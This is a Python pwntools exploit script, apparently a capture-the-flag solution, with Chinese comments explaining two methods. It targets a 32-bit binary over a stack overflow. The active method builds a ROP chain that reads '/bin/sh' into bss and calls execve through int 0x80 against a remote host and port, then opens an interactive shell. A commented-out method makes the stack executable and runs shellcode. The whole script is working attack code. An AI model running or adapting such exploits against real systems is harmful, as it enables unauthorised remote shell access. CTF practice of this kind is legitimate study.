from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/7dba71b8683f4f8884a5110a823708d6')

# p = process('../file/7dba71b8683f4f8884a5110a823708d6')
p = remote('61.147.171.105', '54297')

'''
方法一：
    这个方法的思路是通过调用_dl_make_stack_executable函数使得栈上的shellcode可以执行，
    但是函数的调用需要满足很多条件，比较难理解
'''
# call_dl_make_stack_executable = 0x809A260
# inc_ptr_ecx_ret = 0x080845f8
# pop_ecx_ret = 0x080df1b9
# jmp_esp = 0x080de2bb
# ptr_to_libc_start_end = 0x80A0B05

# # 经过调试发现返回地址偏移为62
# payload = flat(
#     b'a' * 58,
#     ptr_to_libc_start_end - 0x18,
#     pop_ecx_ret,
#     elf.sym['_dl_make_stack_executable_hook'],
#     inc_ptr_ecx_ret,
#     call_dl_make_stack_executable,
#     jmp_esp,
# )
# payload += asm(shellcraft.sh())

# p.sendlineafter(b'Data Size]', b'256')
# p.sendlineafter(b'YourData]', payload)
'''
-----------------------------方法一结束-----------------------------
'''

'''
方法二：
    该方法的思路是通过int 0x80来获得shell，相关条件更容易满足，且比较容易理解，
    eax=11，ebx=参数，ecx=0，edx=0
'''
bss = 0x080ea100
pop_eax_ret = 0x080b89e6
pop_ebx_ret = 0x080481c9
pop_ecx_ret = 0x080df1b9
pop_edx_ret = 0x0806efbb
pop_esi_edi_ebp_ret = 0x080483c8
int_0x80 = 0x0806cbb5
payload = flat(
    b'a' * 62,
    elf.sym['read'], # read(0, bss, 8)
    pop_esi_edi_ebp_ret, # 执行完read后执行的指令
    0,
    bss,
    8,
    pop_eax_ret,
    11,
    pop_ebx_ret,
    bss,
    pop_ecx_ret,
    0,
    pop_edx_ret,
    0,
    int_0x80,
)
p.sendlineafter(b'Data Size]', b'256')
p.sendlineafter(b'YourData]', payload)
p.send(b'/bin/sh')
'''
-----------------------------方法二结束-----------------------------
'''

p.interactive()